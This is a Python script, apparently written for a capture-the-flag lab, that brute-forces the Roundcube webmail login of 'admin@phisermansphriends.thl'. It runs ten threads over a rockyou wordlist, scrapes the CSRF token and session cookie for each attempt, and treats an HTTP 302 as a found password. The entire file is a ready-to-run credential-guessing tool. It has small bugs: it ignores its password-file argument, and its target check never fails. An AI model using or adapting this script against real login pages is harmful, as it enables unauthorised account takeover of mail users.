import argparse
import sys
import requests
import re
from multiprocessing.dummy import Pool as ThreadPool

settings = {
    "username" : "admin@phisermansphriends.thl",  # nombre de usuario
    "threads" : 10,
    "passwords" : "rockyou-50.txt",  # Archivo de passwords
    "url" : "http://mail.phisermansphriends.thl/"
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
}

if (len(sys.argv) > 1):
    console_mode = True
    parser = argparse.ArgumentParser(description='Command line mode')
    parser.add_argument('--url', '-u', type=str,
                        help='roundcube application URL')
    parser.add_argument('--threads', '-t', type=int,
                        help='Number of Threads', default=10)
    parser.add_argument('--username', type=str,
                        help="username to brute")
    parser.add_argument('--passwords', '-p', type=str,
                        help='passwords file')

    args = parser.parse_args()
    if(not args.url):
        print("'--url' was omitted")
        exit(-1)
    if (not args.threads):
        print("'--threads' was omitted")
        exit(-1)
    if (not args.username):
        print("'--username' was omitted")
        exit(-1)
    if (not args.passwords):
        print("'--passwords' was omitted")
        exit(-1)

    settings["username"] = args.username
    settings["threads"] = args.threads
    settings["passwords"] = args.passwords
    settings["url"] = args.url

def parse_token(text):
    pattern = 'request_token":"(.*)"}'
    token = re.findall(pattern, text)
    return token

def brute(password):
    try:
        url = settings['url']
        r = requests.get(url)
        cookies = r.cookies
        token = parse_token(r.text)
        r = requests.post(url + '?_task=login',
                          data={"_token": token, "_task": "login", "_action": "login", "_timezone": "America/Lima",
                                "_url": "", "_user": settings['username'], "_pass": password}, headers=headers, cookies=cookies,
                          allow_redirects=False, timeout=5)

        if (r.status_code == 302):
            print("Success with %s:%s" % (settings['username'], password))
    except Exception as ex:
        print(ex)

def verify():
    try:
        url = settings['url']
        r = requests.get(url, timeout=1)
        token = parse_token(r.text)
        if(token == ""):
            return False
        return True
    except Exception as ex:
        print(ex)
        return False

if __name__ == "__main__":
    passwords = open("rockyou-50.txt").read().split('\n')


    print("%d passwords loaded" % (len(passwords)))
    print("Trying with username %s" % (settings['username']))
    print("-----------------------------------------------------")

    if(not verify()):
        sys.exit()
    pool = ThreadPool(settings['threads'])
    results = pool.map(brute, passwords)
    pool.close()
    pool.join()

    print("-----------------------------------------------------")
    print("The End")
